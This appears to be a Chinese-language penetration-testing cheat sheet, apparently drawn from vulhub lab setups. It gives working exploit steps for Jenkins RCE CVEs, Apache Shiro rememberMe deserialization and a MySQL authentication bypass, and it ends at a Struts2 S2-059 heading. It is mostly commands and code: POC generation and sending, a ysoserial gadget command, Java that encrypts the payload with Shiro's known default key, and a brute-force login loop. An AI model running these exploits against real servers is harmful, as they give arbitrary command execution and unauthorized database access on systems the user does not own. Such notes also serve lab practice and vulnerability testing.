# jenkins
## CVE-2017-1000353(Jenkins-CI RCE)

测试环境为Jenkins ver.2.46.1

- 使用 https://github.com/vulhub/CVE-2017-1000353/releases/download/1.1/CVE-2017-1000353-1.1-SNAPSHOT-all.jar 生成POC

```
java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser "touch /tmp/success"
# jenkins_poc.ser是生成的字节码文件名
# "touch ..."是待执行的任意命令
```

- 使用 https://github.com/vulhub/CVE-2017-1000353/blob/master/exploit.py 发送POC

```
python exploit.py http://your-ip:8080 jenkins_poc.ser
```

## CVE-2018-1000861(RCE)

测试环境为Jenkins ver.2.1.38

- 使用 https://github.com/orangetw/awesome-jenkins-rce-2019/blob/master/exp.py 发送POC

```
python2 'http://your-ip:8080/securityRealm/user/admin' 'ping IP'
```

# shiro
## CVE-2016-4437(反序列化)

- Apache Shiro 1.2.4及以前

Apache Shiro 1.2.4及以前版本中，加密的用户信息序列化后存储在名为remember-me的Cookie中。攻击者可以使用Shiro的默认密钥伪造用户Cookie，触发Java反序列化漏洞，进而在目标机器上执行任意命令。

使用ysoserial生成CommonsBeanutils1的Gadget：

```
java -jar ysoserial-master-30099844c6-1.jar CommonsBeanutils1 "touch /tmp/success" > poc.ser
```

使用Shiro内置的默认密钥对Payload进行加密：

```java
package org.vulhub.shirodemo;

import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.codec.CodecSupport;
import org.apache.shiro.util.ByteSource;
import org.apache.shiro.codec.Base64;
import org.apache.shiro.io.DefaultSerializer;

import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Paths;

public class TestRemember {
    public static void main(String[] args) throws Exception {
        byte[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath("/path", "to", "poc.ser"));

        AesCipherService aes = new AesCipherService();
        byte[] key = Base64.decode(CodecSupport.toBytes("kPH+bIxk5D2deZiIxcaaaA=="));

        ByteSource ciphertext = aes.encrypt(payloads, key);
        System.out.printf(ciphertext.toString());
    }
}
```

发送rememberMe Cookie，即可成功执行touch /tmp/success

以上未成功

使用 https://github.com/feihong-cs/ShiroExploit-Deprecated 

成功

# mysql

- MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not.
- MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not.

在不知道我们环境正确密码的情况下，在bash下运行如下命令，在一定数量尝试后便可成功登录：

```bash
for i in `seq 1 1000`; do mysql -uroot -pwrong -h your-ip -P3306 ; done
```

# Struts2
## S2-059(CVE-2019-0230)

- Struts 2.0.0 - Struts 2.5.20

